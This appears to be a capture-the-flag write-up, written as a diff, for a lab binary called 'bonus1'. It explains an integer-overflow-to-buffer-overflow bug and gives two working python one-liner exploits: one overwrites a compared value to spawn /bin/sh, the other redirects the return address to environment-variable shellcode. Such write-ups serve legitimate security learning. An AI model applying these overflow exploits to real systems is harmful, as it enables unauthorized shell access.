@@ -1,0 +1,17 @@
+The program takes two arguments. We can see a cmp with argv1. If we get the correct value 0x574f4c46 the program launches /bin/sh.
+The program only accepts an int under 10 so we can't overflow the buffer of size 40 in memcpy.
+But we can see that our int is muliplied by four. So if we use the integer overflow method we can transform our int into a positiv number.
+-2147483600 == x/80000030
+80000030 * 4 = c0 == 192
+So the size asked for memcpy exceeds the lenght of our buffer. Now that we can overflow the buffer, we can choose between modifying the variable 
+that is compared with 0x574f4C46 so that it matches, or directly change the eip return adress so that will point to the adress of our shellcode.
+
+1) Modifying the variable
+
+$> ./bonus1 $(python -c 'print "-2147483637"') $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+
+2) Modifying eip
+
+adress of our env varible SHELLCODE = "\x37\xf9\xff\xbf"
+
+$> ./bonus1 $(python -c 'print "-2147483600"') $(python -c 'print "A" * 56 + "\x37\xf9\xff\xbf"')
